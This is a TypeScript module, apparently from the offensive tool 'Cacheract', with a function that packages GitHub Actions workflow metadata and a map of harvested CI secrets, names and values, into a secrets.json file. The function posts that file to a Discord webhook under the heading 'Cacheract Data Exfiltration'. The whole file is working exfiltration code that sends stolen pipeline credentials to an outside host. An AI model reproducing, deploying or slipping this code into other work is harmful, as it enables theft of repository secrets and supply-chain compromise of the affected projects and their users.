import axios from 'axios';

export async function reportDiscord(webhook: string, secrets: Map<String, String>) {
    
    // Gather pipeline telemetry
    const currentWorkflow = process.env['GITHUB_WORKFLOW_REF'];

    const webhookMessage = {
        embeds: [{
            title: '🚨 Cacheract Data Exfiltration',
            color: 0xFF0000, // Red color
            fields: [
                {
                    name: 'Workflow',
                    value: currentWorkflow || 'N/A',
                    inline: true
                },
                {
                    name: 'Runner OS',
                    value: process.env['RUNNER_OS'] || 'N/A',
                    inline: true
                },
                {
                    name: 'Event Type',
                    value: process.env['GITHUB_EVENT_NAME'] || 'N/A',
                    inline: true
                },
                {
                    name: 'Repository',
                    value: process.env['GITHUB_REPOSITORY'] || 'N/A',
                    inline: false
                },
                {
                    name: 'Run ID',
                    value: process.env['GITHUB_RUN_ID'] || 'N/A',
                    inline: true
                },
                {
                    name: 'Secrets Found',
                    value: secrets.size > 0 
                        ? `Found ${secrets.size} secrets:\n\`\`\`\n${Array.from(secrets.keys()).join('\n')}\`\`\`` 
                        : 'None',
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Format secrets as JSON file content
    const secretsJson = JSON.stringify(Object.fromEntries(secrets), null, 2);
    
    // Create FormData
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify(webhookMessage));
    
    // Only attach file if secrets exist
    if (secrets.size > 0) {
        const blob = new Blob([Buffer.from(secretsJson)], { type: 'application/json' });
        formData.append('file', blob, 'secrets.json');
    }

    // Send with FormData
    try {
        await axios.post(webhook, formData, {
            headers: {
                'Content-Type': 'multipart/form-data'
            }
        });
    } catch (error) {
        throw error;
    }
}